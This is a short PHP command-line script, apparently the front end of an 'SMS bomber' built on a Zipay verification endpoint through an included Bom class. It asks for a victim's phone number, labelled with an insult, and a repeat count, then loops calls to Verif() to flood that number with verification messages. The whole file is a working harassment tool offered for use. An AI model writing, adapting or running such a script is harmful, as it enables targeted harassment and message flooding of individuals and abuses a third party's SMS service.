<?php
include 'bomzipay.php';

/*
    https://github.com/nee48/BomSmsZipay
    Made by Handika Pratama
    Modified by まやちゃん
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor Vedebah\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Ejekan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
